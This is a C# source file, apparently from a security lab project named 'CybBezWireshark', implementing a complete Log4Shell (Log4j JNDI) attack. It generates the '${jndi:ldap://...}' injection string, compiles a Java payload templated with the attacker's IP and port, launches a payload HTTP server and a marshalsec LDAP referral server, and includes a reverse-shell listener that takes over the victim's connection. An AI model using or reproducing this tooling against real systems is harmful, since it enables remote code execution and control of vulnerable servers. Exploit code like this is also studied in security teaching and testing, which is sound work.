using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Microsoft.Extensions.Configuration;

namespace CybBezWireshark
{
    internal class Log4Shell
    {        
        public event Action<string>? ErrorLog;

        private int payloadCodeBaseServerPort;
        private int ldapServerPort;
        private int reverseShellListenerPort;
        private string jdkPath;
        private string localIPAddress;
        private string networkAdapterName;

        private Process payloadCodeBaseServer;
        private Process ldapServer;

        private Socket reverseSellServer;

        private NetworkStream netStream;
        private StreamReader reader;
        private StreamWriter writer;


        public Log4Shell(IConfiguration config)
        {
            payloadCodeBaseServerPort = config.GetValue<int>("payloadCodeBaseServerPort");
            ldapServerPort = config.GetValue<int>("ldapServerPort");
            reverseShellListenerPort = config.GetValue<int>("reverseShellListenerPort");
            jdkPath = config.GetValue<string>("jdkPath");
            networkAdapterName = config.GetValue<string>("networkAdapterName");
        }

        public string GetInjection()
        {
            if (localIPAddress == null) throw new Exception("Invoke Start() first.");
            return $"${{jndi:ldap://{localIPAddress}:{ldapServerPort}/Run}}";
        }

        public void Start()
        {
            try
            {
                SetLocalIp();
                CreatePayloadFile();
                CompliePayload();
                StartPayloadCodeBaseServer();
                StartLdapServer();
                //StartReverseShellServer();

                //StartConnection().Wait();
            }
            catch (Exception ex)
            {
                ErrorLog?.Invoke(ex.ToString());
            }
        }

        public async Task<(StreamReader, StreamWriter)> StartConnection()
        {
            netStream?.Dispose();
            reader?.Dispose();
            writer?.Dispose();

            var shellSocket = await reverseSellServer.AcceptAsync();
            netStream = new NetworkStream(shellSocket);
            reader = new StreamReader(netStream);
            writer = new StreamWriter(netStream);

            return (reader, writer);
        }

        private void StartReverseShellServer()
        {
            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, reverseShellListenerPort);
            reverseSellServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            reverseSellServer.Bind(ipe);
            reverseSellServer.Listen(1);
        }

        private void StartLdapServer()
        {
            ldapServer = new Process();
            ldapServer.StartInfo.FileName = $"{jdkPath}\\bin\\java.exe";
            ldapServer.StartInfo.Arguments = $"-cp Resources\\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{localIPAddress}:{payloadCodeBaseServerPort}/CodeBase/#Run {ldapServerPort}";
            //ldapServer.StartInfo.CreateNoWindow = true;

            ldapServer.Start();
        }

        private void SetLocalIp()
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            localIPAddress = interfaces.First(i => i.Name == networkAdapterName).GetIPProperties().UnicastAddresses
                                       .First(a => a.Address.AddressFamily == AddressFamily.InterNetwork).Address
                                       .ToString();
        }

        private void CreatePayloadFile()
        {
            var code = File.ReadAllText("Resources\\Run.java");
            code = code.Replace("{ADDRESS}", localIPAddress);
            code = code.Replace("{PORT}", reverseShellListenerPort.ToString());
            File.WriteAllText($"{Path.GetTempPath()}Run.java", code);
        }

        private void StartPayloadCodeBaseServer()
        {
            payloadCodeBaseServer = new Process();
            payloadCodeBaseServer.StartInfo.FileName = $"Resources\\PayloadCodeBaseServer.exe";
            payloadCodeBaseServer.StartInfo.Arguments = $"--urls http://*:{payloadCodeBaseServerPort} {Path.GetTempPath()}Log4Shell";
            //payloadCodeBaseServer.StartInfo.CreateNoWindow = true;
            //payloadCodeBaseServer.StartInfo.RedirectStandardError = true;
            //payloadCodeBaseServer.ErrorDataReceived += (sender, e) => ErrorLog?.Invoke($"PayloadCodeBaseServer: {e.Data}");

            payloadCodeBaseServer.Start();
            //payloadCodeBaseServer.WaitForExit();

            //var a =  payloadCodeBaseServer.StandardError.ReadToEnd();
        }

        private void CompliePayload()
        {
            using var p = new Process();
            p.StartInfo.FileName = $"{jdkPath}\\bin\\javac.exe";
            p.StartInfo.Arguments = $"{Path.GetTempPath()}Run.java -d {Path.GetTempPath()}Log4Shell\\";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardError = true;

            p.Start();
            p.WaitForExit();

            var e = p.StandardError.ReadToEnd();
            if (!String.IsNullOrWhiteSpace(e))
            {
                throw new Exception(e);
            }
        }

        public void Stop()
        {
            payloadCodeBaseServer?.Kill();
            payloadCodeBaseServer?.Dispose();

            ldapServer?.Kill();
            ldapServer?.Dispose();

            reverseSellServer?.Close();
            reverseSellServer?.Dispose();

            netStream?.Dispose();
            reader?.Dispose();
            writer?.Dispose();
        }
    }
}
